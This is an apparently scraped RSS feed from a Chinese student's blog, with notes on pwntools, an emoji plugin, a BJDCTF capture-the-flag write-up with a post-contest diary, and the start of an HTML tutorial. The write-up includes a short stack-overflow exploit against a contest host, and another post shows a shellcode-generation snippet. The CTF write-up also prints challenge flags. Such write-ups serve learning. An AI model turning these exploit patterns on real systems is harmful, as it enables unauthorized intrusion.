id="ELF模块"><a href="#ELF模块" class="headerlink" title="ELF模块"></a>ELF模块</h4><p>ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很</p><p>相似。用法如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./文件名'</span>)</span><br><span class="line"></span><br><span class="line">put_addr = elf.symbols[<span class="string">'put'</span>] <span class="comment">#函数地址</span></span><br><span class="line"></span><br><span class="line">put_got = elf.got[<span class="string">'put'</span>] <span class="comment">#GOT表的地址</span></span><br><span class="line"></span><br><span class="line">put_plt = elf.plt[<span class="string">'put'</span>] <span class="comment">#PLT表的地址</span></span><br></pre></td></tr></tbody></table></figure><h4 id="shellcode生成器"><a href="#shellcode生成器" class="headerlink" title="shellcode生成器"></a>shellcode生成器</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></tbody></table></figure><h1 id="检查-elf的安全性"><a href="#检查-elf的安全性" class="headerlink" title="检查.elf的安全性"></a>检查.elf的安全性</h1><p>通常拿到一个.elf文件后，首先对它进行检查，具体方法如下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ checksec .elf</span><br></pre></td></tr></tbody></table></figure><p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表；</p><p>Stack：如果栈中开启了Canary found，就不能通过直接溢出的方法覆盖栈中的访问地址，需要绕过</p><p>NX：NX enabled，如果这个保护开启就是意味着栈中的数据没有执行权限，但是可以利用rop绕过</p><p>PIE：PIE enabled，如果程序开启这个地址随机化选项，那么意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话就是No PIE (address)，括号内的数据就是程序的基地址 </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/pwn/#disqus_thread</comments>
    </item>
    
    <item>
      <title>emoji的一些使用</title>
      <link>https://www.los-kos.cn/posts/emoji/</link>
      <guid>https://www.los-kos.cn/posts/emoji/</guid>
      <pubDate>Fri, 27 Mar 2020 03:00:00 GMT</pubDate>
      <description>
      
        个性化操作，值得一看
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>之前看堆堆的blog有emoji，感觉能给博客增加一份光彩，我也整个一个；嘿嘿嘿 <del>\(^o^)/</del>😂</p><a id="more"></a><p>首先来配置一个插件：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-filter-github-emojis --save</span><br></pre></td></tr></tbody></table></figure><p>然后在Hexo的根目录下的<code>_config.yml</code>中，新增一下的配置项：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">githubEmojis:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">className:</span> <span class="string">github-emoji</span></span><br><span class="line">  <span class="attr">inject:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">styles:</span></span><br><span class="line">  <span class="attr">customEmojis:</span></span><br></pre></td></tr></tbody></table></figure><p>这样之后，就可以输入：：（中间填写英文），就能打出来表情</p><p>但是吧，似乎blog有点问题，用：：打出来的和copy的不一样：</p><p><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8">😄</span>  这个是：smile：的</p><p>😄  这个是直接 copy 的 smile</p><p>以后还是直接copy比较好😊</p><p>·</p><p>·</p><p>不得不说，今天才发现微软的输入法真的好用，emoji和颜文字都很方便，看来要从sougou转过来了(●ˇ∀ˇ●)</p><p>下面贴几个emoji  ○( ＾ω＾)っHiahiahia…(●ˇ∀ˇ●) ノ</p><p>😀 😘 😍 😁 😜 😄 😝 😉 🤩 😆</p><p>👈 👉 ✌ 🤞 🤙 🖐 👌 👍 ✍ 👐 💪</p><p>👨 👩 🧑 👧 👦  🧒  👶 👵 👴 🧓</p><p>🍕 🍔 🍟 🌭 🥓 🥞  🥙 🥪  🎂 🧀</p><p>⚽ 🏀 🎱 ⚾ 🏐 🎳 🏉  🏈 🥌 🎯</p><p>🎆 🎇 ✨ 🎉 🎊  🎃 🎄  🎋  🎍 🎑</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/emoji/#disqus_thread</comments>
    </item>
    
    <item>
      <title>第二届BJDCTF——WP</title>
      <link>https://www.los-kos.cn/posts/bjdctf-wp/</link>
      <guid>https://www.los-kos.cn/posts/bjdctf-wp/</guid>
      <pubDate>Mon, 23 Mar 2020 12:32:00 GMT</pubDate>
      <description>
      
        BJDCTF的wp
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>历经36小时的第二届BJDCTF终于结束了，现在距离21点还差不到半小时，正好可以写完就上线，美滋滋；</p><a id="more"></a><h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><p>这次的比赛，算是学到了许多知识，黄老师说得对—不能不学习；</p><p>先看看这个比赛个人成绩吧（惨不忍睹）：</p><table><thead><tr><th align="center">Pwn</th><th align="center">Web</th><th align="center">Misc</th><th align="center">Crypto</th><th align="left">reverse</th><th align="center">Blockchain</th><th align="center">Programming</th><th align="center">Total</th></tr></thead><tbody><tr><td align="center"><strong>2/11</strong></td><td align="center"><strong>0/10</strong></td><td align="center"><strong>3/8</strong></td><td align="center"><strong>6/8</strong></td><td align="left"><strong>1/3</strong></td><td align="center"><strong>0/2</strong></td><td align="center"><strong>0/1</strong></td><td align="center"><strong>12/43</strong></td></tr></tbody></table><p>真的是，技术不行，尽力做了已经；接下来把我做出来的整理一下：</p><p><strong><em>说明一下，因为打比赛的时候没有及时整理记录，正好校外赛在BUU，所以用了里面的题目写这篇Blog</em></strong></p><p><strong><em>注：想刷题、想提高，就上<a href="https://buuoj.cn" target="_blank" rel="noopener">BUUCTF</a> // 绝对没打广告 ^_^</em></strong></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h3><p>这是一道简单的栈溢出的题目，下载附件，检查一波：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/r2t3_1.png" alt="r2t3_1"></p><p>32位程序，开了NX，放进ida：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/r2t3_2.png" alt="r2t3_2"></p><p>这程序很简单，输入一个姓名，然后进入name_check()函数，点开函数来看：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/r2t3_3.png" alt="r2t3_3"></p><p>这里的_int8变量最多可以存储256大小的数字，如果这个数字为257，那么在内存中其实是257-256=1，这里v3的</p><p>长度只能是[3，8)个字符，考虑到存在栈溢出，所以v3也可以是[259，264）</p><p>因为下面有strcpy()函数，所以查看一波空间：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/r2t3_5.png" alt="r2t3_4"></p><p>再寻找一波，又发现了一个重要点：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/r2t3_4.png" alt="r2t3_4"></p><p>这里发现了这个函数，这就会了吧，利用栈溢出，直接可以getshell，下面附上exp：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'52.82.12.160'</span>,<span class="number">21013</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Please input your name:'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">21</span> + p32(<span class="number">0x0804858B</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">259</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="y1ng"><a href="#y1ng" class="headerlink" title="y1ng"></a>y1ng</h3><p>题目有如下信息：<strong>“QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==”</strong></p><p>这是一道签到题目，观察可知Base64加密，直接扔进网站即可</p><p>附上网址：<a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">Base64</a></p><p>解出来就可以了：</p><p><strong><em>flag：BJD{W3lc0me_T0_BJDCTF}</em></strong></p><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>话不多说下载附件，打开如下：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/cat.gif" alt="cat.gif"></p><p>是一张动态图，本来以为是图片隐写，但是发现不是，想来想去好像是“010101”，对了，把”鸡腿“看成1，把“米</p><p>饭”看成0，每一行一个2进制数，然后转换成10进制，10进制对应的ASCII码应该就是了；尝试一波从上到下的10</p><p>进制数是：66 74 68 123 77 33 97 48 126 125 ——然后对应的ASCII解出来即可；</p><p><strong><em>flag：BJD{M!a0~}</em></strong></p><h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>打开附件，<u>发现如下一句话</u></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%96%87%E7%9B%B21.png" alt="老文盲1"></p><p>哇！我惊了，都不认识啊，没关系，新华字典，你值得拥有，咳咳咳，我才不会查字典呢，复制到<a href="http://www.duchulai.com/" target="_blank" rel="noopener">读出来</a> 让电脑</p><p>读一下，注音结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%96%87%E7%9B%B22.png" alt="老文盲2"></p><p>这就很明显了吧，直接写吧（其实我试了10几次提交 ， 呜呜呜）</p><p><strong><em>flag：BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</em></strong></p><h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>这个题目有如下信息：</p><p><strong>“79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20”</strong></p><p>观察发现应该是十六进制，不多说，直接扔进网站—&gt;<a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制转文本</a></p><p>得到了—&gt; <strong>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</strong> </p><p>看起来很像凯撒密码，经过了一轮解密后发现好像不对emmm</p><p>后经卓哥的提示，灵光一闪：</p><p>首先 <strong>BJD —&gt; ZJQ</strong>，这是经过某种变化得来的，没错，就是前面的<strong>“yanzi”</strong>做了一个“周期”转换；实际上不难发</p><p>现，<strong>‘y’ , ‘a’ , ‘n’ , ‘z’ , ‘i’</strong>这5个字母在倒过来的字母表中的顺序，也就是 <strong>‘z’</strong> 是<strong>1</strong>，<strong>‘y’</strong> 是<strong>2</strong>…..这样推过来，<strong>‘a’</strong>  是26，</p><p> <strong>‘n’</strong> 是<strong>13</strong>， <strong>‘i’</strong> 是<strong>18</strong>，然后把16进制转换后的字符串用<strong>“yanzi”</strong>推出来的数字当做需要移动的个数来做“<strong>变异凯撒</strong>”… </p><p>//</p><p>官方wp：这个是维吉尼亚密码，“yanzi”作为密钥…</p><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php" target="_blank" rel="noopener">维吉尼亚</a> 果然都是有技巧的 哎…</p><p>//</p><p>解出来如下：</p><p><strong><em>flag：BJD{yanzi_jiushige_shabi}</em></strong></p><h3 id="灵能精通"><a href="#灵能精通" class="headerlink" title="灵能精通"></a>灵能精通</h3><p>题目是一张图片，打开看一下：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E7%81%B5%E8%83%BD.png" alt="灵能精通"></p><p>本来听说的是这是个猪圈密码，但时百度了一波，没有与题目相同的图案，然后花了100“块钱”买了一个Hint，上</p><p>面写着“星际争霸2，神族，后面自己百度”，心想着没玩过啊，记得堆堆和泽辰好像之前打过，就把Hint发到群里</p><p>了，但时他们最后也没想出来，第二天下午，队友发来了一张图，说是圣堂武士密码：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E5%9C%A3%E5%A0%82%E6%AD%A6%E5%A3%AB%E5%AF%86%E7%A0%81.png" alt="圣堂武士密码"></p><p>对照着密码表，解出flag</p><p><strong><em>flag：BJD{IMKNIGHTSTEMPLAR}</em></strong></p><h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><p>这道题目是最有意思的题目了，先打开文件：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk </span><br><span class="line">zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.</span><br><span class="line">Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot'd z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf'o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. 'Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,' Pzffw ozqh,'os tsn wse azt czw usf lw hqttkf!' Tsn q nqbb vqjk wse npzd wse nztd.</span><br><span class="line"></span><br><span class="line">MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}</span><br></pre></td></tr></tbody></table></figure><p>一看便知，只要解出来每个字母原来的字母就可以了，这里会出现很多问题，作为一名英语弱鸡，硬生生地解了几个小时：</p><p>//</p><p>官方wp：“ 这个字符替换是无序的，直接找个在线的 cryptogram solver 即可解密，比如 quipqiup “</p><p>看到这里心态没了，下面附上解密网站：</p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a> </p><p>但是解出来的答案是错误的，看了Hint，最后一个字符串，如果是“ Cr4cy ”，就是错误的，其实这里我推导的时候</p><p>也发现了，字母w对应两个字母—&gt;’y’ 和 ‘k’ 所以改过来即可</p><p>//</p><p><strong><em>flag：BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</em></strong></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h3><p>这个题目看了好久嘞（我可没说是看小姐姐的啊）</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/xjj.png" alt="小姐姐"></p><p>打开图片（哎呀你就别乱看了，赶紧做题），发现箭头的地方有错位，放入WinHex，搜索BJD发现：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/xjjflag.png" alt="XJJ_Flag"></p><p>得到flag：</p><p><strong><em>flag：BJD{haokanma_xjj}</em></strong></p><h3 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="圣火昭昭"></a>圣火昭昭</h3><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E5%9C%A3%E7%81%AB.png" alt="圣火昭昭"></p><p>图片好像看不出来，按照常规看了下图片属性，里面藏了一句密文：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</span><br></pre></td></tr></tbody></table></figure><p>去<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新约佛论禅</a> 解密可得：</p><p><strong><em>“gemlovecom”</em></strong> 根据提示可知去掉com，得到了<strong><em>”gemlove“</em></strong></p><p>又买了一个Hint：”你猜啊，你倒是猜啊，guess“，气死我了，这句话看不出来啊？</p><p>想来想去想不出来，最后卓哥提示——”outguess“</p><p>百度了一波outguess，最后在Linux里面安装了一波工具，用下面这条指令：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ outguess -k "gemlove" -r sheng_huo_zhao_zhao.jpg  hidden.txt</span><br></pre></td></tr></tbody></table></figure><p><strong><em>flag：BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</em></strong></p><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>打开附件，是一张jpg：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/beayt.png" alt="A_beautiful_picture"></p><p>貌似么有发现什么，怀疑是一道隐写，丢进WinHex：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/beautiful_flag.png" alt="A_beautiful_picture"></p><p>把这里03改为05，保存后打开：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/Abeautiful_Flag.png" alt="beautiful_Flag"></p><p><strong><em>flag：BJD{PnG_He1ghT_1s_WR0ng}</em></strong></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h3><p>这是一道逆向签到题，本来逆向题不会做，但是解答出来的人数非常多，就尝试着做了做</p><p>附件是一个64位的.exe，丢进ida查看了一波：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/guessnum.png" alt="guessnum_flag"></p><p>直接发现flag：</p><p><strong><em>flag：BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}</em></strong></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>由于我不是web选手，不会做web题目，所以web爆零，另外的Blockchain和Programming也不会做；</p><p>这篇wp把会做的整理了吧，后面补完题目，继续整理 +_=</p><p>实力就这样，技不如人，甘拜下风！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/bjdctf-wp/#disqus_thread</comments>
    </item>
    
    <item>
      <title>BJDCTF——赛后总结</title>
      <link>https://www.los-kos.cn/posts/bjd-2nd/</link>
      <guid>https://www.los-kos.cn/posts/bjd-2nd/</guid>
      <pubDate>Mon, 23 Mar 2020 06:00:00 GMT</pubDate>
      <description>
      
        第一次线上个人赛——BJDCTF之旅
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇blog应该是昨天晚上写的，但是昨晚很累，打了三把游戏就去睡觉了2333</p><a id="more"></a><p>3月21日上午9点——3月22日晚上9点进行了第二届<strong><em>BJDCTF</em></strong>线上赛，说的是萌新赛，又是七校联盟（<strong>HUT</strong>… …七所</p><p>学校），我们就跟着参加了…</p><p><strong>// 下面是我这两天的“悲惨”经历 =_=</strong></p><h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><p>第一天早上早早起来（8点多才下床），早饭没吃，就坐在电脑前面准备9点开始比赛，我怀着激动的心情，毕竟</p><p>第一次参加个人赛（之前跟着战队参加过团队赛），开机，打开Chrome、Opera，打开VMware检查网络（断过</p><p>1,2,3…次的网，数不清555），接着就水水群等着9点；</p><p>9点一到，一刷新页面。。。“404”。等到刷新好，签到题一血已经没了，然后我就观察了一波题目，当时题目只有</p><p>一部分，因为这个赛制，有些题目需要做出来另外的题目解锁（我快烦死）；不知如何下手当时，就直接开始从</p><p>pwn开始，第一个pwn题目（忍不住哇的一下就哭了）我到第二天晚上才会，也不能叫会，被大佬指引了一下方</p><p>向；感觉自己好菜好菜，自闭ing！</p><p>下午的时候仍然是做题不顺利，主要是一点思路都没有，Misc真的无能为力，只能抠一抠Crypto（本来主要学的</p><p>pwn) ….好难过啊啊啊</p><p>晚上的时候看了看排行榜，我惊了！！！，前十的选手几乎都没做pwn和web，都在做Misc  //这委屈谁受得了</p><p>最搞笑的是，有人还在群里说，求求前十的大佬，做做pwn和web吧，哈哈哈哈笑了我半天；</p><p>临睡觉的时候看了看排名，前40，感觉不错，明天继续加油<del>~</del></p><h1 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h1><p>这天6点半就起来了，因为昨晚队友们都解答出了一道pwn/game的题目——贪吃蛇，据说玩游戏就可以有答案，</p><p>我没下床就开始玩，哈哈哈，找到了以前玩贪吃蛇的感觉了，但是玩了一局什么也没发现，就去看源码，喔喔，原</p><p>来如此（笑容逐渐 **）就做出来了，好开心；</p><p>然后接着又去网站做那道音乐题目，我卡，那道题真的是神仙题目，我现在脑子还在回放，循环听了几十遍，哎</p><p>呀，真的无语啊； // 感觉学音乐的一下子就能做出来；结果：结束比赛知道答案也弹不出来；</p><p>比赛还剩几个小时的时候，突然题目全部放出来了，太好了，正好有道题目我会，直接拿到了哈哈哈；</p><p>晚上8点钟的时候，我就没做了，自闭了做到最后，身心疲惫，直接去峡谷逛了几圈（/斜眼笑）</p><h1 id="结局"><a href="#结局" class="headerlink" title="结局"></a>结局</h1><p>比赛结束了，发挥得一般般吧，做出来的如下：（rank：14）</p><table><thead><tr><th align="center"><strong>Pwn</strong></th><th align="center">2</th></tr></thead><tbody><tr><td align="center"><strong>Web</strong></td><td align="center"><strong>0</strong></td></tr><tr><td align="center"><strong>Misc</strong></td><td align="center"><strong>3</strong></td></tr><tr><td align="center"><strong>Crypto</strong></td><td align="center"><strong>6</strong></td></tr><tr><td align="center"><strong>Reverse</strong></td><td align="center"><strong>1</strong></td></tr><tr><td align="center"><strong>Total</strong></td><td align="center"><strong>12</strong></td></tr></tbody></table><h1 id="总结与收获"><a href="#总结与收获" class="headerlink" title="总结与收获"></a>总结与收获</h1><p>总的来说，这次比赛收获巨大，首先想说的是：出题人在哪，我给他们寄刀片….开个玩笑嘿嘿</p><p>还是自己太菜了，被出题人按在地上锤，┭┮﹏┭┮    自闭式打法可还行；</p><p>pwn题都是Linux？？！！好好的pwn你来个什么Linux，还在学习中不会做，也是，不能怪出题人，归根结底是</p><p>怪自己水平不够，没得办法；</p><p>Misc &amp; Crypto挺有意思，以后可以发展发展；</p><p>接下来有了学习目标了：</p><p><strong>1、尽快学堆</strong></p><p><strong>2、学隐写</strong></p><p><strong>3、继续学Crypto</strong></p><p><strong>4、还是得学Linux ，跑不了了</strong></p><p>.</p><p>.</p><p>.</p><p>.</p><p>长路漫漫，谁都想做大佬，继续加油，Fighting！！！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/bjd-2nd/#disqus_thread</comments>
    </item>
    
    <item>
      <title>HTML+CSS——基本用法</title>
      <link>https://www.los-kos.cn/posts/html-css/</link>
      <guid>https://www.los-kos.cn/posts/html-css/</guid>
      <pubDate>Fri, 13 Mar 2020 09:00:00 GMT</pubDate>
      <description>
      
        有趣的前端从此开始
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>到目前为止，今年入的两个坑，一个是CTF，这个暂且不说，另一个是Blog；</p><a id="more"></a><h1 id="前篇"><a href="#前篇" class="headerlink" title="前篇"></a>前篇</h1><p>Blog这东西前面的文章也说了，很烦人其实，尤其是配置文件的时候，老是出错；最近看Hexo主题的时候又看上</p><p>了一个主题——Matery；这款主题页面清晰，画风很好，功能很多，想着就换了，但是因为不会前端的内容，里</p><p>面的好多东西，比如 JS 和 CSS 文件看不懂，导致博客页面老是出现bug，于是乎，哈哈哈，就有接下来的学了；</p><p>前端三件套 = HTML + CSS + JS；这些是web开发需要学的东西，非常好玩；</p><p>这篇博客就整理我的学习历程，先开始的HTML，所以先整理HTML；</p><h1 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h1><p>有人会问，编写前端这些代码需要什么IDE，其实这个不需要太大的IDE就行；最简单的是记事本，哈哈哈，没想</p><p>到吧；想着也是，把后缀改成html就行了，还可以用Notepad++；我也在网上找了几款，比如说像Vscode，</p><p>jetbrains公司的webstorm等等，这些都可以用，我也问了几个朋友，挑来挑去，咦~，发现了一款非常好的软件</p><p>——HBuilderX；</p><p>先说说它的好处，这款软件内存特别小，下载就几十MB，非常方便，它可以直接生成一个端口（应该算是），就</p><p>可以浏览你写的网页的样式；最重要的一个优点是，他可以代码补全，对于初学者来说，真的不错；</p><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p>相信大家应该都看过网页源码，初学者可能会问html，总得有个框架吧？有的有的，下面来看：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"><span 